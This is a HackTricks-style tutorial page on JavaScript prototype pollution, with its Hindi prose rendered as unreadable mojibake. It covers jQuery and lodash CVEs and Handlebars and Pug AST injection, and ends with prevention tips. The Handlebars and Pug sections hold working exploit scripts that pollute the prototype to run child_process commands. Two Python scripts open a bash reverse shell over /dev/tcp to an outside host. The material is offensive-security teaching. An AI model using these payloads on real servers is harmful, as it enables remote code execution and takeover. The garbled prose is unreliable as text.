рдорд╛рди рд▓реАрдЬрд┐рдП рдХрд┐ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдПрдХ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рд╣реИ рдЬреЛ `Object.prototype.isAdmin = true` рд╕реЗрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рдмрдирд╛рддрд╛ рд╣реИред рдлрд┐рд░, рдЬрдм рддрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдиреЗ рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рдХреЛрдИ рдорд╛рди рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ рд╣реИ, `user.isAdmin` рд╣рдореЗрд╢рд╛ рд╕рдЪ рд╣реЛрддрд╛ рд╣реИ!

![](https://research.securitum.com/wp-content/uploads/sites/2/2019/10/image-1.png)

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `obj[a][b] = value`. рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд░ `a` рдФрд░ `value` рдХреЗ рдорд╛рди рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рдЙрд╕реЗ рдХреЗрд╡рд▓ `a` рдХреЗ рдорд╛рди рдХреЛ `__proto__` рдореЗрдВ рд╕рдорд╛рдпреЛрдЬрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ (рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ, `obj["__proto__"]` рдФрд░ `obj.__proto__` рдкреВрд░реА рддрд░рд╣ рд╕реЗ рд╕рдорд╛рди рд╣реИрдВ) рддрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдореМрдЬреВрдж рд╕рднреА рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреА рдкреНрд░реЙрдкрд░реНрдЯреА `b` рдХреЛ `value` рд╕реЗ рдЕрд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╣рдорд▓рд╛ рдКрдкрд░ рджрд┐рдП рдЧрдП рдЬрд┐рддрдирд╛ рд╕рд░рд▓ рдирд╣реАрдВ рд╣реИ, [рдкреЗрдкрд░](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf) рдХреЗ рдЕрдиреБрд╕рд╛рд░, рд╣рдо рдХреЗрд╡рд▓ рддрднреА рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрдм рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддреАрди рд╢рд░реНрддреЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ рдкреВрд░реА рд╣реЛрддреА рд╣реИ:

* рдкреБрдирд░рд╛рд╡рд░реНрддреА рдорд░реНрдЬ рдХрд░рдирд╛
* рдкрде рджреНрд╡рд╛рд░рд╛ рдкреНрд░реЙрдкрд░реНрдЯреА рдкрд░рд┐рднрд╛рд╖рд╛
* рдСрдмреНрдЬреЗрдХреНрдЯ рдХреНрд▓реЛрди рдХрд░рдирд╛

### рдлрдВрдХреНрд╢рди рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдб рдХрд░рдирд╛
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto Pollution рд╕реЗ RCE рддрдХ

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб prototype pollution рд╕реЗ XSS рддрдХ

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019тАУ11358: jQuery $ .extend рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ Prototype pollution рд╣рдорд▓рд╛

$ .extend, рдпрджрд┐ рдЧрд▓рдд рддрд░реАрдХреЗ рд╕реЗ рд╕рдВрднрд╛рд▓рд╛ рдЬрд╛рдП, рддреЛ рд╡рд╣ `prototype` рдСрдмреНрдЬреЗрдХреНрдЯ рдХреА рдкреНрд░реЙрдкрд░реНрдЯреАрдЬ рдХреЛ рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИ (рдРрдк рдореЗрдВ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХрд╛ рдЯреЗрдореНрдкреНрд▓реЗрдЯ)ред рдпрд╣ рд╡рд┐рд╢реЗрд╖рддрд╛ рддрдм рд╕рднреА рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдкрд░ рджрд┐рдЦрд╛рдИ рджреЗрдЧреАред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХреЗрд╡рд▓ тАЬрдЧрд╣рд░рд╛тАЭ рд╕рдВрд╕реНрдХрд░рдг (рдЕрд░реНрдерд╛рддреН g) $ .extend рдкреНрд░рднрд╛рд╡рд┐рдд рд╣реЛрддрд╛ рд╣реИред

рдкреНрд░реЛрдЧреНрд░рд╛рдорд░реНрд╕ рдЕрдХреНрд╕рд░ рдЗрд╕ рдлрдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдмрдирд╛рдиреЗ рдпрд╛ рдПрдХ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдСрдмреНрдЬреЗрдХреНрдЯ рд╕реЗ рдирдИ рдкреНрд░реЙрдкрд░реНрдЯреАрдЬ рдХреЛ рднрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:

рд╣рдо рдХрд▓реНрдкрдирд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ `myObject` рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рдПрдХ рдЗрдирдкреБрдЯ рдлреАрд▓реНрдб рд╣реИ рдФрд░ рдЗрд╕реЗ DB рдореЗрдВ рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ)

рдЗрд╕ рдХреЛрдб рдореЗрдВ, рд╣рдо рдЕрдХреНрд╕рд░ рд╕реЛрдЪрддреЗ рд╣реИрдВ, рдЬрдм рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рддреЛ рдирд╡ рдирд┐рд░реНрдорд┐рдд рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ `isAdmin` рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ рдЕрд╕рд╛рдЗрди рдХрд░реЗрдЧрд╛ред рд▓реЗрдХрд┐рди рдореВрд▓ рд░реВрдк рд╕реЗ, рдпрд╣ рд╕реАрдзреЗ `{}` рдХреЛ рдЕрд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ `{}.isAdmin` `true` рд╣реЛрдЧрд╛ред рдпрджрд┐ рдЗрд╕ рдХреЛрдб рдХреЗ рдмрд╛рдж, рд╣рдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬрд╛рдВрдЪ рдХрд░рддреЗ рд╣реИрдВ:
```javascript
If (user.isAdmin === true) {
// do something for admin
}
```
рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрднреА рддрдХ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ ( `undefined`), рддреЛ `isAdmin` рдЧреБрдгрдзрд░реНрдо рдХреА рдЦреЛрдЬ рдЙрд╕рдХреЗ рдкреИрд░реЗрдВрдЯ рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ рдХреА рдЬрд╛рдПрдЧреА, рдЬреЛ рдХрд┐ рдСрдмреНрдЬреЗрдХреНрдЯ рд╣реИ рдЬрд┐рд╕рдореЗрдВ `isAdmin` рдХреЛ рдКрдкрд░ `true` рдорд╛рди рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝рд╛ рдЧрдпрд╛ рд╣реИред

JQuery 3.3.1 рдкрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдПрдХ рдЕрдиреНрдп рдЙрджрд╛рд╣рд░рдг:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
console.log({}.devMode); // true
```
рдпреЗ рддреНрд░реБрдЯрд┐рдпрд╛рдБ рдмрд╣реБрдд рд╕рд╛рд░реЗ Javascript рдкреНрд░реЛрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░ рд╕рдХрддреА рд╣реИрдВ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ NodeJS рдкреНрд░реЛрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ, рд╕рдмрд╕реЗ рд╡реНрдпрд╛рд╡рд╣рд╛рд░рд┐рдХ рдЙрджрд╛рд╣рд░рдг рд╣реИ Mongoose рдореЗрдВ рддреНрд░реБрдЯрд┐, JS рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдЬреЛ MongoDB рдХреЛ рд╕рдВрднрд╛рд▓рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддреА рд╣реИ, рджрд┐рд╕рдВрдмрд░ 2018 рдореЗрдВред

### CVE-2018тАУ3721, CVE-2019тАУ10744: lodash рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ Prototype pollution рд╣рдорд▓рд╛

[Lodash](https://www.npmjs.com/package/lodash) рднреА рдПрдХ рдкреНрд░рд╕рд┐рджреНрдз рд▓рд╛рдЗрдмреНрд░реЗрд░реА рд╣реИ рдЬреЛ рдмрд╣реБрдд рд╕рд╛рд░реЗ рд╡рд┐рднрд┐рдиреНрди рдлрдВрдХреНрд╢рдиреНрд╕ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ, рдЬреЛ рд╣рдореЗрдВ рдХреЛрдб рд▓рд┐рдЦрдиреЗ рдореЗрдВ рдЕрдзрд┐рдХ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдФрд░ рд╕рд╛рдл-рд╕реБрдерд░рд╛ рдмрдирд╛рддреА рд╣реИ, рд╕рд╛рде рд╣реА рд╕рд╛рде 19 рдорд┐рд▓рд┐рдпрди рд╕реЗ рдЕрдзрд┐рдХ рд╕рд╛рдкреНрддрд╛рд╣рд┐рдХ рдбрд╛рдЙрдирд▓реЛрдбреНрд╕ рдХреЗ рд╕рд╛рдеред рдФрд░ рдЗрд╕рдореЗрдВ JQuery рдХреЗ рд╕рдорд╛рди рд╕рдорд╕реНрдпрд╛ рдереАред

**CVE-2018тАУ3721**

**CVE-2019тАУ10744**

рдпрд╣ рдмрдЧ Lodash рдХреЗ рд╕рднреА рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдкрд╣рд▓реЗ рд╣реА рд╕рдВрд╕реНрдХрд░рдг 4.17.11 рдореЗрдВ рдареАрдХ рдХрд┐рдпрд╛ рдЬрд╛ рдЪреБрдХрд╛ рд╣реИред

### CVEs рдХреЗ рд╕рд╛рде рдПрдХ рдФрд░ рдЯреНрдпреВрдЯреЛрд░рд┐рдпрд▓

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

## AST Prototype Pollution

NodeJS рдореЗрдВ, AST рдХрд╛ рдЙрдкрдпреЛрдЧ JS рдореЗрдВ рдмрд╣реБрдд рдмрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдЗрдВрдЬрди рдФрд░ typescript рдЖрджрд┐ред\
рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдЗрдВрдЬрди рдХреЗ рд▓рд┐рдП, рд╕рдВрд░рдЪрдирд╛ рдКрдкрд░ рджрд┐рдЦрд╛рдИ рдЧрдИ рд╣реИред

![img](https://blog.p6.is/img/2020/08/graph_3.jpg)

### Handlebars

рдЬрд╛рдирдХрд╛рд░реА [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/) рд╕реЗ рд▓реА рдЧрдИ рд╣реИ

рдЖрдк `Object.prototype.pendingContent` рдореЗрдВ рдХреЛрдИ рднреА рд╕реНрдЯреНрд░рд┐рдВрдЧ рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╣рдорд▓реЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдХрд╛ рдирд┐рд░реНрдзрд╛рд░рдг рдХрд░ рд╕рдХреЗрдВред\
рдпрд╣ рдЖрдкрдХреЛ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдХрд┐ рд╕рд░реНрд╡рд░ handlebars рдЗрдВрдЬрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдЬрдм рдПрдХ black-box рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ prototype pollution рдореМрдЬреВрдж рд╣реИред
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js -->

...
appendContent: function appendContent(content) {
if (this.pendingContent) {
content = this.pendingContent + content;
} else {
this.pendingLocation = this.source.currentLocation;
}

this.pendingContent = content;
},
pushSource: function pushSource(source) {
if (this.pendingContent) {
this.source.push(this.appendToBuffer(this.source.quotedString(this.pendingContent), this.pendingLocation));
this.pendingContent = undefined;
}

if (source) {
this.source.push(source);
}
}
...
```
```markdown
`appendContent` рдХрд╛ рдХрд╛рд░реНрдп `javascript-compiler.js` рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣реИред\
`appendContent` рдпрд╣ рд╣реИред рдпрджрд┐ `pendingContent` рдореМрдЬреВрдж рд╣реИ, рддреЛ рдЗрд╕реЗ рд╕рд╛рдордЧреНрд░реА рдореЗрдВ рдЬреЛрдбрд╝реЗрдВ рдФрд░ рд╡рд╛рдкрд╕ рдХрд░реЗрдВред

`pushSource` `pendingContent` рдХреЛ `undefined` рдмрдирд╛ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдмрд╛рд░-рдмрд╛рд░ рдбрд╛рд▓рдиреЗ рд╕реЗ рд░реЛрдХрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

**Exploit**

![img](https://blog.p6.is/img/2020/08/graph_5.jpg)

Handlebars рдКрдкрд░ рджрд┐рдЦрд╛рдП рдЧрдП рдЧреНрд░рд╛рдл рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВред

lexer рдФрд░ parser AST рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рдпрд╣ `compiler.js` рдХреЛ рдкрд╛рд╕ рдХрд░рддрд╛ рд╣реИред\
рд╣рдо рдХреБрдЫ рддрд░реНрдХреЛрдВ рдХреЗ рд╕рд╛рде рдХрдВрдкрд╛рдЗрд▓рд░ рджреНрд╡рд╛рд░рд╛ рдЙрддреНрдкрдиреНрди рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдлрдВрдХреНрд╢рди рдХреЛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдпрд╣ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╡рд╛рдкрд╕ рдХрд░рддрд╛ рд╣реИ рдЬреИрд╕реЗ тАЬHello posixтАЭ (рдЬрдм msg posix рд╣реЛ)ред
```
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js -->

case 36:
this.$ = { type: 'NumberLiteral', value: Number($$[$0]), original: Number($$[$0]), loc: yy.locInfo(this._$) };
break;
```
рдкрд╛рд░реНрд╕рд░ handlebars рдореЗрдВ рдПрдХ рдиреЛрдб рдХреЗ рдорд╛рди рдХреЛ, рдЬрд┐рд╕рдХрд╛ рдкреНрд░рдХрд╛рд░ NumberLiteral рд╣реИ, рд╣рдореЗрд╢рд╛ Number рдХрдВрд╕реНрдЯреНрд░рдХреНрдЯрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рд╕рдВрдЦреНрдпрд╛ рд╣реЛрдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк рдпрд╣рд╛рдБ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрдпреВрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЧреИрд░-рд╕рдВрдЦреНрдпрд╛рддреНрдордХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВред
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/base.js -->

function parseWithoutProcessing(input, options) {
// Just return if an already-compiled AST was passed in.
if (input.type === 'Program') {
return input;
}

_parser2['default'].yy = yy;

// Altering the shared object here, but this is ok as parser is a sync operation
yy.locInfo = function (locInfo) {
return new yy.SourceLocation(options && options.srcName, locInfo);
};

var ast = _parser2['default'].parse(input);

return ast;
}

function parse(input, options) {
var ast = parseWithoutProcessing(input, options);
var strip = new _whitespaceControl2['default'](options);

return strip.accept(ast);
}
```
рдкрд╣рд▓реЗ, compile рдлрд╝рдВрдХреНрд╢рди рдХреЛ рджреЗрдЦреЗрдВ, рдФрд░ рдпрд╣ рджреЛ рдкреНрд░рдХрд╛рд░ рдХреЗ рдЗрдирдкреБрдЯ рдХреЛ рд╕рдкреЛрд░реНрдЯ рдХрд░рддрд╛ рд╣реИ, AST Object рдФрд░ рдЯреЗрдореНрдкреНрд▓реЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧред

рдЬрдм input.type `Program` рд╣реЛрддрд╛ рд╣реИ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рдЗрдирдкреБрдЯ рдореВрд▓реНрдп рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╣реЛрддрд╛ рд╣реИред\
Parser рдорд╛рдирддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА AST рд╣реИ рдЬрд┐рд╕реЗ parser.js рджреНрд╡рд╛рд░рд╛ рдкрд╛рд░реНрд╕ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдмрд┐рдирд╛ рдХрд┐рд╕реА рдкреНрд░реЛрд╕реЗрд╕рд┐рдВрдЧ рдХреЗ рдХрдВрдкрд╛рдЗрд▓рд░ рдХреЛ рднреЗрдЬ рджреЗрддрд╛ рд╣реИред
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js -->

...
accept: function accept(node) {
/* istanbul ignore next: Sanity code */
if (!this[node.type]) {
throw new _exception2['default']('Unknown type: ' + node.type, node);
}

this.sourceNode.unshift(node);
var ret = this[node.type](node);
this.sourceNode.shift();
return ret;
},
Program: function Program(program) {
console.log((new Error).stack)
this.options.blockParams.unshift(program.blockParams);

var body = program.body,
bodyLength = body.length;
for (var i = 0; i < bodyLength; i++) {
this.accept(body[i]);
}

this.options.blockParams.shift();

this.isSimple = bodyLength === 1;
this.blockParams = program.blockParams ? program.blockParams.length : 0;

return this;
}
```
рдХрдВрдкрд╛рдЗрд▓рд░, AST рдСрдмреНрдЬреЗрдХреНрдЯ (рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ) рдХреЛ `accept` рдореЗрдердб рдХреЛ рднреЗрдЬрддрд╛ рд╣реИред\
рдФрд░ `accept` рдХрдВрдкрд╛рдЗрд▓рд░ рдХреЗ `this[node.type]` рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИред\
рдлрд┐рд░ AST рдХреЗ body рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ рдХреЛ рд▓реЗрдХрд░ рдлрдВрдХреНрд╢рди рдХрд╛ рдирд┐рд░реНрдорд╛рдг рдХрд░рддрд╛ рд╣реИред
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];


const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());

/*
function (container, depth0, helpers, partials, data) {
var stack1, lookupProperty = container.lookupProperty || function (parent, propertyName) {
if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {
return parent[propertyName];
}
return undefined
};

return ((stack1 = (lookupProperty(helpers, "undefined") || (depth0 && lookupProperty(depth0, "undefined")) || container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || {}), console.log(process.mainModule.require('child_process').execSync('id').toString()), {
"name": "undefined",
"hash": {},
"data": data,
"loc": {
"start": 0,
"end": 0
}
})) != null ? stack1 : "");
}
*/
```
**рдЙрджрд╛рд╣рд░рдг**

[https://github.com/hughsk/flat/issues/105](https://github.com/hughsk/flat/issues/105)
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
### рдкрдЧ

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [https://blog.p6.is/AST-Injection/#Pug](https://blog.p6.is/AST-Injection/#Pug) рдкрд░ рджреЗрдЦреЗрдВред
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
## рд░реЛрдХрдерд╛рдо рдХреЗ рд▓рд┐рдП рдореИрдВ рдХреНрдпрд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реВрдБ?

* `Object.freeze` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░реЙрдкрд░реНрдЯреАрдЬ рдХреЛ рдлреНрд░реАрдЬ рдХрд░реЗрдВ (`Object.prototype`)
* рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╕реНрдХреАрдорд╛ рдХреЗ рдЕрдиреБрд╕рд╛рд░ JSON рдЗрдирдкреБрдЯреНрд╕ рдкрд░ рд╡реИрд▓рд┐рдбреЗрд╢рди рдХрд░реЗрдВ
* рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рддрд░реАрдХреЗ рд╕реЗ рд░рд┐рдХрд░реНрд╕рд┐рд╡ рдорд░реНрдЬ рдлрдВрдХреНрд╢рдиреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рди рдХрд░реЗрдВ
* рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдЪреЗрди рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рдиреЗ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП `Object.create(null)` рдЬреИрд╕реЗ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░реЙрдкрд░реНрдЯреАрдЬ рдХреЗ рдмрд┐рдирд╛ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ
* `Object` рдХреЗ рдмрдЬрд╛рдп `Map` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ
* рд▓рд╛рдЗрдмреНрд░реЗрд░реАрдЬ рдХреЗ рд▓рд┐рдП рдирдП рдкреИрдЪреЗрд╕ рдХреЛ рдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ рдЕрдкрдбреЗрдЯ рдХрд░реЗрдВ

## рд╕рдВрджрд░реНрдн

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
